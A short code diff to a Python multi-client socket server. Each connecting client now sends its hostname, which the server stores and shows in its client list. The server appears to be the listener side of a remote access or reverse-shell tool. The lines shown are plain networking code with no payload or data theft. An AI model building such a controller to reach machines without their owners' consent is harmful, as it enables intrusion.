@@ -73,10 +73,12 @@ def socket_accept():
     global blnFirstRun, arAddresses
     while True:
         try:
-            conn, arAddress = objSocket.accept()
+            conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
             arConnections.append(conn)  # append connection to array
-            arAddresses.append(arAddress)
+            client_hostname = conn.recv(1024).decode("utf-8")
+            address = address + (client_hostname,)
+            arAddresses.append(address)
             print("\n" + "A user has just connected ;) ....")
         except socket.error:
             print("Error accepting connections!")
@@ -151,7 +153,7 @@ def list_connections():
 
     for intCounter, conn in enumerate(arConnections):
         strClients += str(intCounter) + "\t" + str(arAddresses[intCounter][0]) + "\t" + \
-                      str(socket.getfqdn(arAddresses[intCounter][0])) + "\t" + str(arAddresses[intCounter][1]) + "\n"
+                       str(arAddresses[intCounter][1]) + "\t" + str(arAddresses[intCounter][2]) + "\n"
     print("\n" + "Users:" + "\n" + strClients)
 
 
